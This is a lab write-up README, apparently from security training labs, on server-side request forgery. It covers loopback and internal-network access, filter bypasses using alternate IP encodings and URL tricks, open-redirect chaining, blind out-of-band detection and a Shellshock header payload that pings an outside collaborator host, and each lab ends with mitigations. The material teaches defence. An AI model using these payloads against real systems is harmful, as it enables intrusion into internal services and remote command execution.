# SSRF
Server-Side Request Forgery (SSRF) Attacks Playbook

<img width="720" height="736" alt="Server-side request forgery (SSRF)" src="https://github.com/user-attachments/assets/ab8967d6-88b1-40a4-9d4b-178b76e65840" />

---

## 🧨 SSRF Exploitation Techniques

---

### 1️⃣ Server-Side Request Forgery (SSRF)

**What breaks**
The application allows user-controlled input to influence server-side HTTP requests without enforcing strict destination validation.

**Why it happens**

* Trusting URLs provided by users
* Lack of outbound network restrictions
* Regex-based or partial validation

**Impact**

* Internal service access
* Cloud metadata exposure
* Credential theft
* Remote command execution (when chained)

**Mitigation**

* Enforce strict destination allowlists
* Block private, loopback, and link-local IPs
* Monitor outbound requests

---

### 2️⃣ Basic SSRF Against the Local Server

*(Lab #1)*

**What breaks**
The server fetches arbitrary URLs and allows loopback access.

**Exploitation logic**

* Point the server back to itself
* Access internal-only endpoints

**Examples**

```
http://localhost
http://127.0.0.1
http://127.0.0.1/admin
```

**Impact**

* Authentication bypass
* Access to internal admin functionality

**Mitigation**

* Block loopback addresses
* Validate resolved IPs before request


<img width="633" height="605" alt="Burp Proiest intruder" src="https://github.com/user-attachments/assets/585b0ff1-0293-4901-9440-05c8abc0e42d" />

<img width="624" height="618" alt="Burp" src="https://github.com/user-attachments/assets/dc85e4fc-6073-4b93-8764-6363b81b3eb6" />

<img width="293" height="60" alt="Screenshot 2026-01-30 at 6 27 37 PM" src="https://github.com/user-attachments/assets/c46e0ff3-0d49-41a0-b536-6d8cb309de9e" />

---

### 3️⃣ Basic SSRF Against Another Back-End System

*(Lab #2)*

**What breaks**
The front-end server can reach internal network services.

**Exploitation logic**

* Target private IP ranges
* Enumerate internal services

**Examples**

```
http://10.0.0.5
http://192.168.0.10
http://172.16.0.1
```

**Impact**

* Internal service discovery
* Exposure of admin panels and APIs

**Mitigation**

* Block private IP ranges
* Restrict outbound traffic

<img width="240" height="41" alt="stockApi-" src="https://github.com/user-attachments/assets/13731dde-c7ce-48f8-9553-1859a16e32dd" />

<img width="222" height="57" alt="connection" src="https://github.com/user-attachments/assets/bdf2190a-841b-4a0d-a409-00a7ca72f327" />

<img width="432" height="238" alt="Attacktype Snipe" src="https://github.com/user-attachments/assets/e5f412d2-0e86-4b04-b4f1-4c9339a320c1" />

<img width="490" height="350" alt="NTTP1 1 200 00" src="https://github.com/user-attachments/assets/e438c408-d7a3-4281-9c91-bc33db973b86" />

---

### 4️⃣ SSRF with Blacklist-Based Input Filter

*(Lab #3)*

**What breaks**
The application blocks known bad strings instead of validating destinations.

**Exploitation logic**

* Bypass filters using alternative IP representations
* Abuse URL parsing quirks

**Examples**

```
http://127.1
http://2130706433
http://0177.0.0.1
http://0x7f000001
```

**Impact**

* Blacklist bypass
* Internal SSRF

**Mitigation**

* Avoid blacklist-based filtering
* Resolve and validate IP addresses


<img width="291" height="59" alt="5 stockApi-" src="https://github.com/user-attachments/assets/3ce33a9f-0aa9-40d7-841b-4f6c0ee50ecd" />


<img width="491" height="326" alt="Target httpsac271fefleeaa5e58034596000030001 wtb secu" src="https://github.com/user-attachments/assets/877052d6-7285-4a1b-a207-bf8dc76a5536" />

<img width="403" height="304" alt="Request" src="https://github.com/user-attachments/assets/18bf8038-46fd-4e61-829e-70eeb32161e9" />

<img width="422" height="287" alt="tanissnnalaissnnntdisais kuanene k" src="https://github.com/user-attachments/assets/3aa6e6b6-8e57-4e5d-914d-e37dde031493" />

<img width="300" height="310" alt="IPv4 to IP Decimal Conversion" src="https://github.com/user-attachments/assets/d5baafbb-3003-4d74-acfd-6444528bf5cc" />

<img width="506" height="303" alt="nActions v" src="https://github.com/user-attachments/assets/02d6fc96-d5b4-48fe-b51c-15f0c1816df6" />

<img width="461" height="271" alt="1 POST productstock HTTP1 1" src="https://github.com/user-attachments/assets/12ca7490-ed89-47a7-9c0a-1895365a2225" />

<img width="963" height="394" alt="Bentley" src="https://github.com/user-attachments/assets/542b9a3e-7120-4624-83d9-9da2a287bcfc" />

<img width="261" height="51" alt="connection close" src="https://github.com/user-attachments/assets/300b0bc7-7db9-423b-bb00-44a465efca9c" />

<img width="519" height="313" alt="httppac271te11eeaa3e58034578000030001 veb-securi" src="https://github.com/user-attachments/assets/cc39e9b0-6a18-46d6-acfd-dc4d4d9cd054" />

<img width="1375" height="723" alt="Screenshot 2026-01-30 at 6 44 39 PM" src="https://github.com/user-attachments/assets/29a6149c-80eb-4446-9c8b-d4b9dadc3d09" />

---

### 5️⃣ SSRF with Whitelist-Based Input Filter

*(Lab #4)*

**What breaks**
Hostname allowlists are enforced without verifying resolved IPs.

**Exploitation logic**

* Abuse DNS resolution behavior
* Use crafted hostnames

**Examples**

```
http://allowed.com@localhost
http://localhost.allowed.com
```

**Impact**

* Whitelist bypass
* Internal network access

**Mitigation**

* Validate resolved IP addresses
* Use IP-based allowlists

<img width="390" height="84" alt="pttps3As2Es2Estock weliketoshop nets3A808012Eprodu" src="https://github.com/user-attachments/assets/3bb78803-b9ce-47c8-a5e3-cf94cfc6da7a" />

<img width="372" height="72" alt="IstockApi=" src="https://github.com/user-attachments/assets/d77e79fd-ff9d-43d5-8aad-6c876df9bfaf" />

<img width="376" height="52" alt="stockhpi-httpstock weliketoshop net" src="https://github.com/user-attachments/assets/c1320b76-4136-43bf-8a8a-c97f6454ef31" />

<img width="721" height="388" alt="Raw in Actions v" src="https://github.com/user-attachments/assets/21577c50-b266-4de1-b96d-c62051aa28c1" />

<img width="671" height="447" alt="1 POST productstock HTTP1 1" src="https://github.com/user-attachments/assets/0f2e6413-9855-4029-beaa-45efea906e8b" />

<img width="677" height="436" alt="Actions v" src="https://github.com/user-attachments/assets/0cb62535-4d7b-4ac6-a277-ad85062ee1c3" />

---

### 6️⃣ SSRF with Filter Bypass via Open Redirection

*(Lab #5)*

**What breaks**
The application validates the initial URL but blindly follows redirects.

**Exploitation logic**

1. Supply a trusted domain
2. Redirect to an internal resource

**Examples**

```
https://trusted.com/redirect?url=http://127.0.0.1/admin
```

**Impact**

* SSRF filter bypass
* Internal endpoint access

**Mitigation**

* Validate final redirect destination
* Disable automatic redirects


<img width="750" height="92" alt="stockhpi-httpusernamepstock weliketoshop net" src="https://github.com/user-attachments/assets/97b9ffb2-ea7b-4332-8690-389182d575cf" />

<img width="411" height="69" alt="stockap1=" src="https://github.com/user-attachments/assets/5ff531eb-c1a8-482f-b786-230abbaeaac7" />

<img width="1277" height="553" alt="Screenshot 2026-01-30 at 7 03 55 PM" src="https://github.com/user-attachments/assets/df2daefe-b18c-473f-9a2b-118882a2c8e1" />

---

### 7️⃣ Blind SSRF with Out-of-Band Detection

*(Lab #6)*

**What breaks**
The server performs requests but does not return responses.

**Exploitation logic**

* Use OAST / Burp Collaborator
* Observe DNS or HTTP callbacks

**Examples**

```
http://<collaborator>.oastify.com
```

**Impact**

* SSRF confirmation without response data
* Pivot for advanced exploitation

**Mitigation**

* Monitor outbound DNS/HTTP traffic
* Restrict server egress


<img width="1113" height="510" alt="https2a33085004ac72)e1652c7e1wtt9cwcb secursty-acadcay netpooduct)productld" src="https://github.com/user-attachments/assets/4af7520e-b9fe-4d5f-a70e-5ad077083a3e" />

<img width="1239" height="474" alt="Screenshot 2026-01-30 at 7 40 15 PM" src="https://github.com/user-attachments/assets/9d2d95fb-3e76-4eab-bf62-899caa950cb6" />

<img width="2818" height="1384" alt="Pasted Graphic 1" src="https://github.com/user-attachments/assets/0ea9b521-43f2-4fe5-9eeb-396ac99f763b" />

<img width="542" height="420" alt="next-product" src="https://github.com/user-attachments/assets/e1de08a6-6436-423c-a05f-9eb06ba957a5" />

<img width="1267" height="531" alt="Screenshot 2026-01-30 at 7 45 34 PM" src="https://github.com/user-attachments/assets/c819a3b2-6f69-4908-9c88-6ea0df10edae" />

<img width="1061" height="600" alt="Contest-Length 3177" src="https://github.com/user-attachments/assets/508a2b91-ec1e-4f65-86fb-641fc18d23c9" />

<img width="520" height="116" alt="Te trailers" src="https://github.com/user-attachments/assets/4719f4c0-d67b-4538-a432-d00b80d210d8" />


<img width="1474" height="863" alt="Screenshot 2026-01-30 at 8 13 10 PM" src="https://github.com/user-attachments/assets/056ee8c6-ea0a-4b19-87b2-f2fb0b176154" />

---

### 8️⃣ Blind SSRF with Shellshock Exploitation

*(Lab #7)*

**What breaks**
Server-side requests reach a vulnerable CGI endpoint.

**Exploitation logic**

* Inject Shellshock payload via headers
* Achieve command execution out-of-band

**Examples**

```http
User-Agent: () { :; }; ping <collaborator>.oastify.com
```

**Impact**

* Remote command execution
* Full server compromise

**Mitigation**

* Patch Shellshock vulnerabilities
* Sanitize forwarded headers
* Restrict outbound access

<img width="1191" height="540" alt="Screenshot 2026-01-30 at 8 33 28 PM" src="https://github.com/user-attachments/assets/084ed837-554e-4755-9fe3-c07bc6026614" />


<img width="998" height="478" alt="Response" src="https://github.com/user-attachments/assets/2105bde7-d6ff-4448-b136-cdae25856984" />

<img width="1017" height="322" alt="Paylonds so generate 3" src="https://github.com/user-attachments/assets/a79b2f35-b8e0-4d7d-8cd8-aa05da34de44" />


<img width="533" height="368" alt="GET productproductId-1 HTTP2" src="https://github.com/user-attachments/assets/dc0e6e0f-25d1-4899-8ca0-7af850377949" />

<img width="700" height="60" alt="154 Mtps0320083043a16c4832e82," src="https://github.com/user-attachments/assets/a90b83d9-787b-4963-a709-34a705c51260" />

<img width="599" height="304" alt="Y Filter" src="https://github.com/user-attachments/assets/6ed6804b-123d-4382-9aab-7cbb7a08d964" />

<img width="1029" height="455" alt="NTTP" src="https://github.com/user-attachments/assets/243aa893-d945-44a4-a06e-acc68a53362b" />

<img width="725" height="402" alt="Request" src="https://github.com/user-attachments/assets/bedf8aa2-1487-47bb-a7a0-3fb3ff25b208" />

<img width="732" height="495" alt="Request" src="https://github.com/user-attachments/assets/e94c1b34-6152-4c5a-a500-8942df312f6e" />

<img width="890" height="718" alt="Dur Project" src="https://github.com/user-attachments/assets/c5ef8993-c897-4f2c-bfd3-7ed9451ca405" />

---

## ⚠️ Common Root Causes

* Trusting user-controlled URLs
* Blacklist-based filtering
* Blind redirect handling
* Missing outbound firewall rules
* Assuming internal networks are safe

---

## 🛡️ Defensive Checklist

* ✔ Enforce strict destination allowlists
* ✔ Block loopback, private, and link-local IPs
* ✔ Resolve and validate final destinations
* ✔ Disable automatic redirects
* ✔ Monitor outbound DNS and HTTP traffic

---


